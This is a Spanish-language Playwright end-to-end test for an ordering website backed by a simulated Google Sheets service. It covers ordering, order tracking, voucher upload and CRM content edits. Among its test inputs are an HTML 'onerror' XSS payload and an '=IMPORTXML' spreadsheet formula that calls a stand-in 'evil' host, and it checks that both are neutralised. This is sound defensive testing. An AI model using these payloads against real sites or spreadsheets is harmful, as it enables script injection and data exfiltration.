/* Prueba de punta a punta: el sitio real en Chromium, con Google Sheets simulado (pruebas/simulador.js).
   Correr:  node pruebas/sitio.test.js   (necesita Playwright instalado)
   Hace un pedido completo, lo rastrea, sube el comprobante y revisa que nada inyecte código. */
const { chromium } = require('playwright');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { cargar } = require('./simulador');

const RAIZ = path.join(__dirname, '..');
const TIPOS = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.png': 'image/png', '.jpg': 'image/jpeg' };
// mismas cabeceras de seguridad que Cloudflare (archivo _headers): si la política bloquea algo, la prueba lo ve
const CABECERAS = Object.fromEntries(fs.readFileSync(path.join(RAIZ, '_headers'), 'utf8').split('\n').filter(l => /^\s+\S+:/.test(l)).map(l => { const i = l.indexOf(':'); return [l.slice(0, i).trim(), l.slice(i + 1).trim()]; }));
const server = http.createServer((req, res) => {
  const f = path.join(RAIZ, decodeURIComponent(new URL(req.url, 'http://x').pathname));
  if (!f.startsWith(RAIZ) || !fs.existsSync(f) || fs.statSync(f).isDirectory()) { res.writeHead(404); return res.end(); }
  res.writeHead(200, { ...CABECERAS, 'Content-Type': TIPOS[path.extname(f)] || 'application/octet-stream' }); fs.createReadStream(f).pipe(res);
});

let fallas = 0;
const ok = (c, m) => { console.log(c ? '✓' : '✗', m); if (!c) fallas++; };

(async () => {
  await new Promise(r => server.listen(0, r));
  const base = `http://localhost:${server.address().port}/`;
  const sim = cargar({ silencio: true });
  const token = sim.config('Token del sitio');
  const b = await chromium.launch();
  const ctx = await b.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  const errores = [];
  page.on('pageerror', e => errores.push(e.message));
  page.on('console', m => { if (m.type() === 'error' && /Content Security Policy|Refused/.test(m.text())) errores.push('CSP: ' + m.text()); });
  page.on('dialog', d => { errores.push('dialog: ' + d.message()); d.dismiss(); });
  // Google Sheets simulado: el sitio manda su token real; aquí se cambia por el del simulador
  await page.route(/script\.google\.com/, async route => {
    if (route.request().method() === 'GET') {
      const q = Object.fromEntries(new URL(route.request().url()).searchParams);
      return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sim.get(q)) });
    }
    const body = JSON.parse(route.request().postData() || '{}');
    if (body.accion === 'comprobante') sim.ctx.__ocr = `Transferencia BAC\nMonto L ${global.anticipo}.00\nRef 8812`;
    const out = sim.post({ ...body, token });
    await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(out) });
  });
  await page.route(/fonts\.(googleapis|gstatic)\.com/, r => r.fulfill({ status: 200, body: '' }));

  // 1. catálogo y aviso de privacidad
  await page.goto(base + 'catalogo.html');
  ok(await page.isVisible('#aviso'), 'Aviso de privacidad aparece la primera vez');
  await page.click('[data-aviso="ok"]');
  ok(!(await page.isVisible('#aviso')), 'Aviso se cierra con "Entendido"');
  ok(await page.locator('header.nav .links a').count() >= 4, 'Menú común montado');
  ok(await page.locator('footer a[href="privacidad.html"]').count() > 0, 'Pie con enlace a privacidad');

  // 2. pedido completo con datos maliciosos
  await page.evaluate(() => openCard(0)); await page.waitForTimeout(300);
  await page.click('#addBtn'); await page.waitForTimeout(150);
  await page.click('#addBtn'); await page.waitForTimeout(150);
  await page.click('#addBtn'); await page.waitForTimeout(150);
  await page.click('#addBtn'); await page.waitForTimeout(900);
  await page.click('#cartBtn'); await page.click('#goCheckout');
  await page.fill('[name=name]', '<img src=x onerror="window.__xss=1">Ana');
  await page.fill('[name=phone]', '9876 5432');
  await page.fill('[name=email]', 'ana@correo.com');
  await page.fill('[name=city]', '=IMPORTXML("http://evil";"//a")');
  await page.click('#sendOrder'); await page.waitForTimeout(200);
  ok(await page.isVisible('#e_consent:not(:empty)'), 'Sin aceptar el aviso no deja enviar');
  await page.check('[name=consent]');
  await page.waitForTimeout(2600); // un humano tarda: el servidor rechaza envíos instantáneos
  await page.click('#sendOrder');
  await page.waitForSelector('#done.open', { timeout: 15000 }).catch(() => {});
  const done = await page.textContent('#doneTxt');
  const id = (done.match(/PEHN-\d{6}-\d{3}/) || [])[0];
  ok(!!id, 'Pedido enviado, número: ' + id);
  const fila = sim.hoja('Pedidos')[0] || {};
  ok(fila.Ciudad && fila.Ciudad.texto, 'La ciudad con fórmula quedó como texto en la hoja');
  ok(sim.hoja('Partidas').length === 1 && String(sim.hoja('Partidas')[0]['Archivo vista previa']).includes('drive'), 'Foto del diseño guardada en Drive');
  global.anticipo = Math.round(Number(fila.Total) * 0.5);

  // 3. rastrear pedido: el número y WhatsApp se recuerdan en este dispositivo
  await page.goto(base + 'pedido.html');
  ok(await page.locator('#misPedidos [data-mio]').count() === 1, 'Lista "Tus pedidos en este dispositivo"');
  await page.click('#misPedidos [data-mio]');
  await page.waitForSelector('.ped-card', { timeout: 8000 });
  ok((await page.textContent('.ped-card')).includes(id), 'Muestra el pedido');
  ok(!(await page.textContent('.ped-card')).includes('Ana'), 'No muestra el nombre del cliente');

  // 4. comprobante
  const jpg = path.join(__dirname, 'comprobante.jpg');
  fs.writeFileSync(jpg, Buffer.from('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==', 'base64'));
  await page.setInputFiles('#voucher', jpg);
  await page.waitForTimeout(400);
  await page.click('#sendVoucher');
  await page.waitForFunction(() => /Pagado/.test(document.querySelector('.ped-montos')?.textContent || '') && !document.querySelector('#sendVoucher'), null, { timeout: 8000 }).catch(() => {});
  const pagos = sim.hoja('Pagos');
  ok(pagos.length === 1 && pagos[0].Resultado === 'Coincide', 'Comprobante leído: ' + (pagos[0] || {}).Resultado);
  ok((await page.textContent('.ped-montos')).includes(String(global.anticipo).replace(/\B(?=(\d{3})+(?!\d))/g, ',')), 'Pagado se actualiza en la página');
  fs.unlinkSync(jpg);

  // 5. teléfono equivocado
  await page.fill('[name=phone]', '9111 2222'); await page.click('#seguirBtn'); await page.waitForTimeout(400);
  ok(/No encontramos/.test(await page.textContent('#seguirErr')), 'WhatsApp ajeno no ve el pedido');

  // 6. contenido editable desde el CRM
  const k = JSON.stringify(sim.config('Clave del CRM'));
  sim.run(`crm(${k}, "sitio", { cambios: [{ clave: 'anuncio', valor: 'Envíos gratis esta semana' }, { clave: 'hero.titulo', valor: '<img src=x onerror="window.__xss=1">Hola' }, { clave: 'color.marca', valor: '#3355AA' }, { clave: 'faq.2.p', valor: '' }, { clave: 'contacto.whatsapp', valor: '50499998888' }] })`);
  await page.goto(base + 'index.html'); await page.waitForTimeout(600);
  ok((await page.textContent('.announce')) === 'Envíos gratis esta semana', 'Anuncio cambiado desde el CRM');
  ok((await page.textContent('[data-edit="hero.titulo"]')).startsWith('<img'), 'Texto con HTML se muestra como texto');
  ok((await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--brand').trim().toUpperCase())) === '#3355AA', 'Color de marca cambiado');
  ok(await page.evaluate(() => document.querySelector('[data-edit="faq.2.p"]').closest('details').hidden), 'Pregunta vacía se oculta');
  ok((await page.getAttribute('.wa-float', 'href')).includes('50499998888'), 'WhatsApp nuevo en los botones');

  // 7. resto de páginas
  for (const p of ['index.html', 'privacidad.html']) { await page.goto(base + p); await page.waitForTimeout(300); ok(await page.locator('header.nav').count() === 1, p + ' carga con menú'); }
  await page.click('#borrarDatos');
  ok(await page.evaluate(() => !localStorage.getItem('pehn_pedidos') && !localStorage.getItem('pehn_contact')), 'Botón borrar limpia el navegador');

  ok(!(await page.evaluate(() => window.__xss)), 'Ningún texto del cliente ejecutó código');
  ok(!errores.length, 'Sin errores de JavaScript' + (errores.length ? ': ' + errores.join(' | ') : ''));
  await b.close(); server.close();
  console.log(fallas ? `\n${fallas} fallaron` : '\nTodo pasó');
  process.exit(fallas ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
